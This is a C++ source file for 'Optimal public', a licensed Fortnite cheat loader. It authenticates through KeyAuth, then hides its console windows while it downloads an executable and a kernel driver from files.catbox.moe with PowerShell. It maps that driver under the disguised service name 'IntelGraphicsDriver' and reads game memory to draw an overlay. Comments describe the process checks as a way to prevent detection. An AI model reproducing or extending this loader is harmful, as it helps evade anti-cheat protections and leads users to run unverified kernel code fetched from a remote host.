#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <chrono>
#include <thread>
#include <fstream>
#include <ctime>
#include <filesystem>
#include <algorithm>
#include <shlobj.h>
#include <mutex>

#include "keyauth_simple.hpp"
#include "keyauth.hpp" // deine hochgeladene Implementierung
#include "keyauth_config.hpp"

#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>

#include <d3d9.h>
#include "imgui.h"
#include "imgui_impl_dx9.h"
#include "imgui_impl_win32.h"

#include "driver/comm.hpp"
#include "menu.hpp"
#include "settings/settings.hpp"
#include "login_dialog.hpp"
// --------------------------------------------------
// Hinweis:
// Dieser Code ersetzt/ergänzt deine vorhandene main.cpp.
// Er geht davon aus, dass restliche symbols/ Funktionen
// (z.B. intel_driver::..., get_process_wnd, create_overlay, etc.)
// im Projekt vorhanden sind.
// --------------------------------------------------

void SetConsoleSize(int width, int height);
void SetConsoleTransparency(int transparency);
void drvload();
void drvunload();
void cleanup_on_exit();
static void InitializeConsole()
{
    AllocConsole();
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    freopen_s(&fp, "CONIN$", "r", stdin);

    SetConsoleTitleA("Optimal");

    SetConsoleSize(900, 500);
    SetConsoleTransparency(255);

    system("color 07");
    system("cls");

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hOut, &csbi);
    COORD newSize = { 120, 30 };
    SetConsoleScreenBufferSize(hOut, newSize);
}


#pragma comment(lib, "d3d9.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

using namespace std;

LPDIRECT3DDEVICE9 g_pd3dDevice = nullptr;

static std::mutex g_logMutex;
static void AppendCrashLog(const std::string& line)
{
    std::lock_guard<std::mutex> lock(g_logMutex);
    std::ofstream log("crashlog.txt", std::ios::app);
    if (!log.is_open()) return;
    std::time_t now = std::time(nullptr);
    char buf[32]{};
    std::tm local_tm{};
    if (localtime_s(&local_tm, &now) == 0)
    {
        std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &local_tm);
    }
    else
    {
        buf[0] = '\0';
    }
    log << "[" << buf << "] " << line << std::endl;
}

static LONG WINAPI TopLevelExceptionHandler(EXCEPTION_POINTERS* exceptionInfo)
{
    DWORD code = exceptionInfo && exceptionInfo->ExceptionRecord ? exceptionInfo->ExceptionRecord->ExceptionCode : 0;
    void* addr = exceptionInfo && exceptionInfo->ExceptionRecord ? exceptionInfo->ExceptionRecord->ExceptionAddress : nullptr;
    char msg[256]{};
    sprintf_s(msg, "Unhandled exception 0x%08X at %p", code, addr);
    AppendCrashLog(msg);
    MessageBoxA(NULL, msg, "Optimal public Unhandled Crash", MB_ICONERROR | MB_OK);
    Sleep(10000);
    return EXCEPTION_EXECUTE_HANDLER;
}

std::string random_string_main(const int len) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.reserve(len);
    for (int i = 0; i < len; ++i) {
        result += chars[rand() % chars.length()];
    }
    return result;
}

void PrintMessage(const string& message, const string& type) {

    time_t now = time(nullptr);
    struct tm timeinfo{};
    localtime_s(&timeinfo, &now);
    char timeStr[9]{};
    strftime(timeStr, sizeof(timeStr), "%H:%M:%S", &timeinfo);

    string fullMessage;
    if (type == "error") {
        fullMessage = "[" + string(timeStr) + "] [ERROR] " + message;
    }
    else if (type == "success") {
        fullMessage = "[" + string(timeStr) + "] [SUCCESS] " + message;
    }
    else if (type == "info") {
        fullMessage = "[" + string(timeStr) + "] [INFO] " + message;
    }
    else if (type == "separator") {
        fullMessage = "[" + string(timeStr) + "] ==========================================";
    }
    else {
        fullMessage = "[" + string(timeStr) + "] [MESSAGE] " + message;
    }

    if (type == "error") {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_INTENSITY);
    }
    else if (type == "success") {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    }
    else if (type == "info") {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    }
    else if (type == "separator") {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    }
    else {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    DWORD written;
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), fullMessage.c_str(), fullMessage.length(), &written, NULL);
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "\n", 1, &written, NULL);

    FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
    Sleep(10);

    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

std::string GetPublicIP() {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("curl -s api.ipify.org", "r"), _pclose);
    if (!pipe) {
        return "N/A";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
    result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());
    return result.empty() ? "N/A" : result;
}

void AnimateText(const string& text, int delay = 20) {
    return;
}

bool IsProcessRunning(const wstring& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    bool found = false;
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                found = true;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}

bool CheckForBlockingProcesses() {
    vector<wstring> blockingProcesses = {
        L"",
        L"",
        L"",
        L""
    };

    vector<wstring> runningProcesses;

    for (const auto& process : blockingProcesses) {
        if (IsProcessRunning(process)) {
            runningProcesses.push_back(process);
        }
    }

    if (!runningProcesses.empty()) {
        string message = "Please close the following applications before loading the driver:\n\n";
        for (const auto& process : runningProcesses) {
            int size = WideCharToMultiByte(CP_UTF8, 0, process.c_str(), -1, NULL, 0, NULL, NULL);
            string narrowProcess(size, 0);
            WideCharToMultiByte(CP_UTF8, 0, process.c_str(), -1, &narrowProcess[0], size, NULL, NULL);
            narrowProcess.pop_back();

            message += "- " + narrowProcess + "\n";
        }
        message += "\nThis is required to prevent detection and ensure safe operation.";

        MessageBoxA(NULL, message.c_str(), "´Optimal public - Close Applications", MB_ICONWARNING | MB_OK);
        return true;
    }

    return false;
}

void SetConsoleTransparency(int transparency) {
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow) {
        SetLayeredWindowAttributes(consoleWindow, 0, transparency, LWA_ALPHA);
    }
}

void SetConsoleSize(int width = 900, int height = 500) {
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow) {
        RECT rect;
        GetWindowRect(consoleWindow, &rect);
        SetWindowPos(consoleWindow, NULL, rect.left, rect.top, width, height, SWP_NOZORDER);
    }
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void CheckAdmin() {
    if (!IsAdmin()) {
        system("cls");
        PrintMessage("Please run as administrator!", "error");
        Sleep(3000);
        exit(0);
    }
}

bool IsDriverLoaded() {
    return intel_driver::init_driver();
}

void LoadDriver() {
    PrintMessage("Loading driver...", "info");
    drvload();
    PrintMessage("Driver loading completed", "success");
}

void UnloadDriver() {
    PrintMessage("Unloading driver...", "info");
    drvunload();
}

bool CheckDriverStatus() {
    return intel_driver::init_driver();
}

void ShowDriverStatus() {
    if (CheckDriverStatus()) {
        PrintMessage("Driver Status: LOADED", "success");
    }
    else {
        PrintMessage("Driver Status: NOT LOADED", "error");
    }
}

void ManageDriver() {
    PrintMessage("=== DRIVER MANAGEMENT ===", "separator");
    ShowDriverStatus();

    if (!CheckDriverStatus()) {
        if (CheckForBlockingProcesses()) {
            PrintMessage("Driver loading blocked due to running applications", "error");
            return;
        }

        PrintMessage("Driver not loaded. Loading now...", "info");
        drvload();
        Sleep(2000);

        if (CheckDriverStatus()) {
            PrintMessage("Driver loaded successfully!", "success");
        }
        else {
            PrintMessage("Driver loading failed!", "error");
        }
    }
    else {
        PrintMessage("Driver already loaded!", "success");
    }

    PrintMessage("=== DRIVER MANAGEMENT COMPLETE ===", "separator");
}


void WaitForFortnite() {
    MessageBoxA(NULL, "Click OK when you are in Lobby!", "Optimal public - Ready to Inject", MB_OK | MB_ICONINFORMATION);

    const wstring target = L"FortniteClient-Win64-Shipping.exe";
    while (!IsProcessRunning(target)) {
        this_thread::sleep_for(chrono::seconds(1));
    }
    PrintMessage("Fortnite found!", "success");
    Beep(600, 300);
}

void InitializeCheat() {
    PrintMessage("Cheat functions activated", "success");
}

std::string GetCredentialsFilePath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::string app_dir = std::string(path) + "\\Optimal public";
        std::filesystem::create_directories(app_dir);
        return app_dir + "\\creds.json";
    }
    return "creds.json";
}

static std::string LoadSavedKey() {
    try {
        std::string path = GetCredentialsFilePath();
        if (!std::filesystem::exists(path)) return "";
        std::ifstream ifs(path, std::ios::in);
        if (!ifs.is_open()) return "";
        std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
        ifs.close();

        // Very simple parse: accept either plain key or JSON {"key":"..."}
        size_t pos = content.find("\"key\"");
        if (pos != std::string::npos) {
            size_t colon = content.find(':', pos);
            if (colon != std::string::npos) {
                size_t firstQuote = content.find('\"', colon);
                if (firstQuote != std::string::npos) {
                    size_t secondQuote = content.find('\"', firstQuote + 1);
                    if (secondQuote != std::string::npos) {
                        return content.substr(firstQuote + 1, secondQuote - (firstQuote + 1));
                    }
                }
            }
        }

        // fallback: trim whitespace and return entire file (if it looks like a key)
        content.erase(std::remove_if(content.begin(), content.end(), ::isspace), content.end());
        if (content.size() > 5 && content.size() < 256) return content;
    }
    catch (...) {}
    return "";
}

static void SaveKeyToFile(const std::string& key) {
    try {
        std::string path = GetCredentialsFilePath();
        std::ofstream ofs(path, std::ios::out | std::ios::trunc);
        if (!ofs.is_open()) return;
        // Save as simple JSON
        ofs << "{ \"key\": \"" << key << "\" }";
        ofs.close();
    }
    catch (...) {}
}

HANDLE                   g_cheatProcess = NULL;


void runHiddenProcess(const std::string& command) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    HANDLE hStdOutput = CreateFile(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
    HANDLE hStdError = CreateFile(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
    si.hStdOutput = hStdOutput;
    si.hStdError = hStdError;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Convert UTF-8 std::string -> wide string for CreateProcessW
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    wchar_t* wcommand = new wchar_t[size_needed];
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, wcommand, size_needed);

    if (!CreateProcessW(
        NULL,
        wcommand,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &si,
        &pi)
        ) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ")." << std::endl;
        delete[] wcommand;
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdOutput);
    CloseHandle(hStdError);
    delete[] wcommand;
}

// Helper: convert wide string (UTF-16) -> UTF-8 std::string
static std::string ws_to_utf8(const std::wstring& w) {
    if (w.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

void drvload() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    std::wstring ddmpa = std::wstring(tempPath) + L"ddmpa.exe";
    std::wstring driver = std::wstring(tempPath) + L"driver.sys";

    std::wstring psDownloadddmpa = L"powershell -Command \"Invoke-WebRequest -Uri 'https://files.catbox.moe/z2eo5p.bin' -OutFile '" + ddmpa + L"'\"";
    std::wstring psDownloaddriver = L"powershell -Command \"Invoke-WebRequest -Uri 'https://files.catbox.moe/wbf3x5.sys' -OutFile '" + driver + L"'\"";

    runHiddenProcess(ws_to_utf8(psDownloadddmpa));
    runHiddenProcess(ws_to_utf8(psDownloaddriver));

    if (GetFileAttributesW(ddmpa.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    if (GetFileAttributesW(driver.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    std::wstring executeCommandW = L"\"" + ddmpa + L"\" \"" + driver + L"\"";
    runHiddenProcess(ws_to_utf8(executeCommandW));
}

void drvunload() {
    PrintMessage("Unloading driver...", "info");

    if (intel_driver::driver_handle && intel_driver::driver_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(intel_driver::driver_handle);
        intel_driver::driver_handle = NULL;
        PrintMessage("Driver handle closed", "success");
    }

    std::string unloadCommand = "powershell -Command \"try { sc stop IntelGraphicsDriver 2>$null; sc delete IntelGraphicsDriver 2>$null; Write-Host 'Driver unloaded successfully' } catch { Write-Host 'Driver unload failed' }\"";
    runHiddenProcess(unloadCommand);
    PrintMessage("Driver unload command executed", "info");
}

void cleanup_on_exit() {
    PrintMessage("Cleaning up on exit...", "info");

    if (intel_driver::driver_handle && intel_driver::driver_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(intel_driver::driver_handle);
        intel_driver::driver_handle = NULL;
        PrintMessage("Driver handle closed", "success");
    }

    PrintMessage("Unloading driver service...", "info");
    std::string unloadCommand = "powershell -Command \"try { sc stop IntelGraphicsDriver 2>$null; sc delete IntelGraphicsDriver 2>$null; Write-Host 'Driver unloaded successfully' } catch { Write-Host 'Driver unload failed' }\"";
    runHiddenProcess(unloadCommand);

    PrintMessage("Cleanup completed", "success");
}

int main(int argc, char* argv[]) {
    SetUnhandledExceptionFilter(TopLevelExceptionHandler);
    SetErrorMode(SEM_NOGPFAULTERRORBOX);

    // Optional: initial console (wenn du Konsole brauchst)
    InitializeConsole();

    SetConsoleTitleA("Optimal public");

    // -------------------------------
    // KeyAuth Initialisierung & Login
    // -------------------------------
    try {
        // KEYAUTH_APP_NAME etc. werden aus keyauth_simple.hpp bereitgestellt
        KeyAuth::api KeyAuthApp(KEYAUTH_APP_NAME, KEYAUTH_OWNER_ID, KEYAUTH_APP_SECRET, KEYAUTH_APP_VERSION, KEYAUTH_SERVER_URL);
        KeyAuthApp.init();

        if (!KeyAuthApp.response.success) {
            std::string msg = "KeyAuth Init failed: " + KeyAuthApp.response.message;
            AppendCrashLog(msg);
            MessageBoxA(NULL, msg.c_str(), "Auth Error", MB_ICONERROR);
            return 1;
        }

        // Versuch gespeicherten Key zu laden
        std::string savedKey = LoadSavedKey();
        bool authed = false;

        if (!savedKey.empty()) {
            PrintMessage("Saved key found, attempting auto-login...", "info");
            KeyAuthApp.license(savedKey);
            if (KeyAuthApp.response.success) {
                authed = true;
                PrintMessage("Auto-login successful.", "success");
            }
            else {
                PrintMessage(std::string("Auto-login failed: ") + KeyAuthApp.response.message, "error");
            }
        }

        // Falls kein Key oder Auto-Login fehlgeschlagen: Key vom Benutzer anfordern
        if (!authed) {
            // Optional: du kannst hier ein Win32-Dialogfeld oder ImGui Input verwenden
            std::string key;
            PrintMessage("Please enter your license key:", "info");
            std::cout << "> ";
            std::getline(std::cin, key);

            if (key.empty()) {
                MessageBoxA(NULL, "No key entered. Exiting.", "License Error", MB_ICONERROR);
                return 1;
            }

            KeyAuthApp.license(key);

            if (!KeyAuthApp.response.success) {
                std::string err = std::string("Invalid or expired key!\n\n") + KeyAuthApp.response.message;
                MessageBoxA(NULL, err.c_str(), "License Error", MB_ICONERROR);
                return 1;
            }
            else {
                // Erfolg: Key speichern (optional)
                SaveKeyToFile(key);
                PrintMessage("Login successful and key saved locally.", "success");
            }
        }

        // Ausgabe verbleibende Laufzeit (falls vorhanden)
        std::string expiryInfo = KeyAuth::format_expiry(KeyAuthApp.user_data.expiry);
        std::string successMsg = "Login successful!\nKey valid for: " + expiryInfo;
        MessageBoxA(NULL, successMsg.c_str(), "Authentication Success", MB_OK | MB_ICONINFORMATION);
    }
    catch (const std::exception& e) {
        AppendCrashLog(std::string("Exception during auth: ") + e.what());
        MessageBoxA(NULL, ("Exception during auth: " + std::string(e.what())).c_str(), "Auth Exception", MB_ICONERROR);
        return 1;
    }
    catch (...) {
        AppendCrashLog("Unknown exception during auth");
        MessageBoxA(NULL, "Unknown exception during auth", "Auth Exception", MB_ICONERROR);
        return 1;
    }

    // -------------------------------
    // Nach erfolgreichem Auth läuft der Loader weiter
    // -------------------------------

    if (CheckForBlockingProcesses()) {
        return 1;
    }

    ManageDriver();

    PrintMessage("Cleaning up driver files...", "info");
    std::string sysPath = "C:\\Windows\\Temp\\ud.sys";
    std::string exePath = "C:\\Windows\\Temp\\udud.exe";

    if (std::filesystem::exists(sysPath)) {
        std::filesystem::remove(sysPath);
        PrintMessage("Driver file deleted", "success");
    }
    if (std::filesystem::exists(exePath)) {
        std::filesystem::remove(exePath);
        PrintMessage("Mapper file deleted", "success");
    }

    PrintMessage("Waiting for Fortnite...", "info");
    WaitForFortnite();
    InitializeCheat();
    PrintMessage("Initializing overlay...", "info");

    intel_driver::process_id = intel_driver::find_process(L"FortniteClient-Win64-Shipping.exe");
    if (intel_driver::process_id == 0) {
        MessageBoxA(NULL, "Error: Fortnite process not found!\n\nPlease make sure Fortnite is running and try again.", "Optimal public - Process Error", MB_ICONERROR | MB_OK);
        return 1;
    }

    game_wnd = get_process_wnd(intel_driver::process_id);
    if (game_wnd == NULL) {
        MessageBoxA(NULL, "Error: Fortnite window not found!\n\nPlease make sure Fortnite is in windowed mode and try again.", "Optimal public - Window Error", MB_ICONERROR | MB_OK);
        return 1;
    }

    virtualaddy = intel_driver::find_image();
    cr3 = intel_driver::fetch_cr3();

    create_overlay();
    directx_init();
    render_loop();

    cleanup_on_exit();
    return 0;
}